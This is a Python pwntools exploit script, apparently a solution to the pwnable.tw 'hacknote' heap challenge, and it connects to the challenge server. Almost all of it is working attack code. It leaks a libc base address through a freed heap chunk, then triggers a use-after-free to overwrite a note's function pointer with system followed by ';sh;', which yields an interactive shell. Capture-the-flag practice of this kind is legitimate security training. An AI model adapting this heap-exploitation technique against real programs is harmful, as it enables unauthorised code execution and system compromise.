#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
#context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']
success = lambda name, value: log.success('{} -> {:#x}'.format(name, value))
def debug():
    if local == 0:
        return
    binaryname = 'hacknote'
    interruptPoint=[0x879, 0x93d]
    pid = int(os.popen('pgrep {}'.format(binaryname)).readlines()[0])
    maps = os.popen('cat /proc/{}/maps'.format(pid))
    ELFaddr = 0
    libcaddr = 0
    for inf in maps.readlines():
        if ELFaddr == 0:
            if binaryname in inf:
                ELFaddr = int(inf.split('-', 1)[0], 16)
        if libcaddr == 0:
            if 'libc' in inf:
                libcaddr = int(inf.split('-', 1)[0], 16)
    info('pid : {}'.format(pid))
    success('elfbase', ELFaddr)
    success('libcbase', libcaddr)
    if len(interruptPoint) :
        for p in interruptPoint:
            success('interruptPoint', p+ELFaddr)
    raw_input('debug>')
local = 0
if local:
    io = process('./hacknote')
    libc = ELF('/glibc/2.23/32/lib/libc-2.23.so')
    mainarena = 0x1af780
else:
    io = remote('chall.pwnable.tw', 10102)
    libc = ELF('./libc_32.so.6')
    mainarena = 0x1b0780

def add(size, content):
    io.sendlineafter('choice :', '1')
    io.sendlineafter('size :', str(size))
    io.sendafter('tent :', content)

def show(index):
    io.sendlineafter('choice :', '3')
    io.sendlineafter('dex :', str(index))

def delete(index):
    io.sendlineafter('choice :', '2')
    io.sendlineafter('dex :', str(index))

if __name__ == '__main__':
    add(0x80, 'aaaa') # 0
    add(0x80, 'bbbb') # 1
    debug()
    delete(0)
    add(0x80, 'cccc') # 2
    show(2)
    io.recvuntil('cccc')
    libcbase = u32(io.recv(4)) - mainarena - 48
    success('libcbase', libcbase)
    libc.address = libcbase
    sys = libc.sym['system']
    binsh = libc.search('/bin/sh').next()

    delete(2)
    delete(1)

    add(8, p32(sys) + ';sh;') #3
    show(0)

    io.interactive()
    io.close()


